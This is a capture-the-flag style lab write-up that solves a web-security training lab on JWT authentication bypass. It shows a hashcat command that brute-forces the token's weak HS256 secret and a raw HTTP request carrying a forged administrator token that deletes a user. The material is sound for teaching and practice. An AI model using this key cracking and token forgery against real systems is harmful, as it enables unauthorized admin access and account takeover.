# Lab: JWT authentication bypass via weak signing key

## LAB DESC

```
This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```
## SOLUTION

Wellthis web app uses HS256 to sign the JWT which is easily crackable by using a long wordlist like `rockyou.txt` or `jwt.secrets.list`.  

We need to run a hash cracker algorithm, I chose `hashcat` for this purpose.  

```bash
hashcat -a 0 -m 16500 "eyJraWQiOiJkNmM2MmY5Yi0wOTM1LTRlOWEtOWM4NC04NGI5MDBlODgyMGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjM1NjY3MSwic3ViIjoid2llbmVyIn0.URMAiZuIfVKurH_M2Xir070-_bGe2fy0q3cfh8OgGWc" jwt.secrets.list
```
This helped me to crack the password to sign the token which was `secret1`.

I created my new payload and signed it with `secret1` and got admin privilieges. Thus, deleted the user _Carlos_ using the og payload and voila!
## RESPONSE BODY

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0a7b0062040732058049215100f30013.web-security-academy.net
Cookie: session=eyJraWQiOiJkNmM2MmY5Yi0wOTM1LTRlOWEtOWM4NC04NGI5MDBlODgyMGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjM1NjY3MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.GTxAr36cPasOidhDdvmG_3gOGx97nt4PWRThR_ur7jU
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a7b0062040732058049215100f30013.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

> LAB SOLVED
